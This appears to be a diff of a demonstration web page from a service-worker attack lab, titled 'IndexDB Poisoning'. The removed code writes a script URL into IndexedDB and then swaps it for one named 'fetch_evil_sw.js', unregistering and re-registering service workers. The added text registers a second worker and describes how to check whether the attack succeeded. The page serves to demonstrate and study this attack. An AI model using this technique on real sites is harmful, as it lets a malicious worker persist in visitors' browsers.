@@ -12,64 +12,10 @@
 		   
 	  function register_sw(){
 	  		 if('serviceWorker' in navigator) {
-				      navigator.serviceWorker.register('./sw.js');
+				      navigator.serviceWorker.register('./sw2.js');
 			 };
 	  }
-	  function create_db(){
-		  const request = indexedDB.open('demo_db', 1);
-
-		  request.onupgradeneeded = function(event) {
-			 var db = event.target.result;
-			 db.createObjectStore('urls',{keyPath:'id'}); 
-			 var transaction = event.target.transaction;
-
-			 transaction.oncomplete = function(event) {    
-				 var txn = db.transaction('urls','readwrite')
-				 txn.onsuccess =  function(ev){
-				     alert('Benign URL Added!!')
-				 }
-				 var store = txn.objectStore('urls')
-				 
-				var db_op_req = store.add({'id':'report_url', 'url':'https://demopwa.github.io/SW_Attacks/helper_scripts/fetch_sw.js'})
-				 db_op_req.onsuccess = function(event) {
-				  	register_sw()
-				};
-				 			 
-			 }
-		  }
-	  }
-
-          
-          
-          function modify_indexDB(){
-              const request = indexedDB.open('demo_db', 1);
-              request.onsuccess = (event) => {
-                     var db = event.target.result;
-                     var txn = db.transaction('urls','readwrite')
-                     txn.onsuccess =  function(ev){
-                         alert('URL Modified!!. Reload Page')
-                     }
-                     var store = txn.objectStore('urls')
-		     store.delete('report_url').onsuccess = ev => {
-			     var db_op_req = store.put({'id':'report_url', 'url':'https://demopwa.github.io/SW_Attacks/helper_scripts/fetch_evil_sw.js'})
-			     db_op_req.onsuccess = function(event) { 
-					if('serviceWorker' in navigator) 
-					{
-					      navigator.serviceWorker.getRegistrations().then(function(registrations) {
-						    for(let registration of registrations) {
-							    registration.unregister()					   
-						    }
-					      }).then(function(){
-							 register_sw()
-					      }).catch(function(err) {
-							console.log('Service Worker registration failed: ', err);
-					      });
-					};
-			    }
-		     }
-              }
-          }
-	  create_db()
+	  register_sw()
           function refresh_image(){
 	  	var url = document.getElementById("img-demo").getAttribute("src");
 		fetch(url)
@@ -88,13 +34,9 @@
     <main>
         <h1> IndexDB Poisoning </h1>
 	<div>
-		<p>To test this attack, Follow the below steps</p>
-		<ol>
-      <li> Click the button below </li>
-		</ol>
+		<p>This page installs another SW. If attack worked, the image will be different from previous page on clicking refresh button</p>
 		
-		<input type="button" value="Click Me!!" onclick=modify_indexDB()>
-		</div>
+	</div>
 	    	
 	    	<img id="img-demo" src='https://avatars0.githubusercontent.com/u/70142'/>
 		<button onclick=refresh_image()>Refesh Image</button>
